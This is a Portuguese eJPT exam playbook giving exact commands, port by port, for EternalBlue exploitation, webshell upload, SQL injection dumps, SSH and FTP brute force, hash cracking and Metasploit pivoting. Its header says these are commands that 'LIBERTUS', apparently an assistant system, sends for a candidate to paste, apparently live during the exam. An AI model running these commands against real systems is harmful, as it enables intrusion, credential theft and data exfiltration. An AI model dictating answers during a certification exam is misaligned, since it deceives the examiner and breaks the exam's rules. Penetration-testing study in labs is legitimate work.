# CENÁRIOS eJPT — Passo a Passo
Atualizado 2026-10-14 (véspera do exame). Cada cenário = comandos EXATOS que LIBERTUS manda pro Lorran colar.
Substituir `IP`=alvo, `LHOST`=IP do Kali (`ip addr`).

---

## CENÁRIO A — Porta 445 aberta (SMB → MS17-010 / EternalBlue)
**O mais cobrado no eJPT.**

**Passo 1 — Identificar o Windows e confirmar a vuln**
```bash
nmap -p445 --script smb-os-discovery,smb-vuln-ms17-010 IP
```
→ Se aparecer `VULNERABLE: Remote Code Execution (MS17-010)` = go.

**Passo 2 — Explorar (oneliner p/ evitar copy/paste múltiplo)**
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; run"
```

**Passo 3 — Já no meterpreter (SYSTEM):**
```bash
getuid
sysinfo
hashdump
shell
```
Depois: `type C:\Users\Administrator\Desktop\flag.txt` (ou procurar flag/proof).

**Se falhar:** `set ForceExploit true` e `run` de novo. Ou usar `use auxiliary/scanner/smb/smb_ms17_010` pra reconfirmar.

---

## CENÁRIO B — Porta 21 aberta (FTP anonymous + credenciais fracas)

**Passo 1 — Testar anônimo**
```bash
nmap -p21 --script ftp-anon IP
```

**Passo 2 — Entrar e baixar tudo**
```bash
ftp IP
# Name: anonymous
# Password: (Enter vazio)
ls -la
get updates.txt /tmp/updates.txt
get flag.txt /tmp/flag.txt
exit
cat /tmp/updates.txt
```
→ Arquivos costumam ter dicas ("usernames = passwords") e credenciais.

**Passo 3 — Se achar webshell (.aspx/.php) no FTP + IIS/Apache:**
Acessar via Chrome: `http://IP/cmdasp.aspx` → executar `whoami`, `ipconfig /all`, `arp -a`.

**Passo 4 — Credenciais fracas (só se alvo pequeno/óbvio):**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://IP -t 4 -f
```
Sempre testar credenciais achadas em OUTROS serviços (SSH, CMS) — reuso é tema do exame.

---

## CENÁRIO C — Porta 80/8080 aberta (web → gobuster + SQLi + webshell)

**Passo 1 — Mapear o app**
```bash
nmap -p80,8080 --script http-enum,http-title IP
whatweb http://IP        # se disponível
curl -s -I http://IP
```

**Passo 2 — Enumerar diretórios**
```bash
gobuster dir -u http://IP -w /usr/share/wordlists/common.txt -x php,txt,html -t 50
```
→ Procurar /admin, /login.php, /uploads, /phpmyadmin, /wp-admin.

**Passo 3 — WordPress? (acessa via vhost às vezes)**
```bash
curl -s -H "Host: wordpress.local" http://IP/ | grep -i themes
nmap -p80 --script http-wordpress-enum IP
```

**Passo 4 — SQL Injection**
```bash
sqlmap -u "http://IP/page.php?id=1" --batch --dbs
sqlmap -u "http://IP/page.php?id=1" --batch -D BANCO --tables
sqlmap -u "http://IP/page.php?id=1" --batch -D BANCO -T users --dump
```

**Passo 5 — Upload de webshell (se houver /upload)**
```bash
# criar shell PHP
echo '<?php system($_GET["c"]); ?>' > /tmp/sh.php
# subir via formulário, depois:
# no Chrome: http://IP/uploads/sh.php?c=id   (usar barra do Chrome se terminal não digita "?")
```
Depois de RCE → reverse shell (ver Netcat no cheatsheet).

---

## CENÁRIO D — Porta 22 aberta (SSH → bruteforce + chaves)

**Passo 1 — Banner/versão**
```bash
nmap -p22 -sV IP
```

**Passo 2 — Antes de brutar: TENTAR credenciais já achadas**
```bash
ssh usuario@IP        # ex: auditor:auditor, ou user achado em arquivo FTP
```
Reuso de credencial resolve mais rápido que hydra.

**Passo 3 — Bruteforce (só com user conhecido e wordlist enxuta)**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -f
# com lista de users:
hydra -L users.txt -P pass.txt ssh://IP -t 4 -f
```
**Pitfall:** rockyou completo em SSH é lento demais. Se demorar, cortar e usar credenciais achadas.
**Se o hydra local não tiver módulo SSH** (caso do apoio local do LIBERTUS — no Kali da INE funciona normal):
```bash
# MSF (recomendado)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; set THREADS 4; run"
# ou nmap
nmap -p22 --script ssh-brute --script-args passdb=/usr/share/wordlists/rockyou.txt,userdb=users.txt IP
# ou wrapper local
bash ~/LIBERTUS/ejpt/sshbrute.sh IP root /usr/share/wordlists/rockyou.txt
```

**Passo 4 — Chave SSH encontrada (em FTP/web/backup)**
```bash
chmod 600 id_rsa
ssh -i id_rsa usuario@IP
# chave com passphrase → quebrar:
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Passo 5 — Já dentro → escalar**
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

---

## CENÁRIO E — Rede /24 descoberta (PIVOTING com Metasploit)
**Obrigatório no exame.** Contexto: você comprometeu um host de borda que tem 2 placas de rede.

**Passo 1 — Confirmar a 2ª rede (dentro da sessão meterpreter/shell)**
```bash
# Windows:
ipconfig /all          # olhar "DNS Servers" e IP da 2ª interface
arp -a
route print
# Linux:
ip addr; ip route; arp -a
```
→ Ex: DNS aponta 192.168.0.2 → rede interna 192.168.0.0/24.

**Passo 2 — Rota automática pra rede interna**
```bash
# no meterpreter:
run autoroute -s 192.168.0.0/24
# alternativa manual (background primeiro):
background
route add 192.168.0.0 255.255.255.0 1
route print
```

**Passo 3 — Escanear a rede interna através do pivot**
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.0.0/24
set PORTS 21,22,80,139,445,3306,3389,10000
run
```

**Passo 4 — Port forward pra atacar serviço interno do Kali**
```bash
# no meterpreter:
portfwd add -l 3389 -p 3389 -r 192.168.0.10
portfwd list
# agora 127.0.0.1:3389 do Kali = 3389 do host interno
```

**Passo 5 — SOCKS + proxychains (usar nmap/hydra na interna)**
```bash
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 1080
run
# depois, fora do msf:
proxychains nmap -sT -Pn -p445 192.168.0.10
```
→ Repetir cenários A-D nos hosts internos descobertos (ex: Webmin porta 10000 é clássico interno).

---

## FLUXO GERAL DO EXAME (ordem mental)
1. `ip addr` → descobrir rede.
2. `nmap -sn RANGE.0/24` → hosts vivos.
3. `nmap -sV -p-` em cada host → serviços.
4. Por porta aberta → cenário correspondente (A-E acima).
5. Achou credencial? Testar em TODOS os serviços.
6. Host com 2 redes? → Cenário E (pivot).
7. Anotar TUDO: IPs, portas, users, senhas, flags.
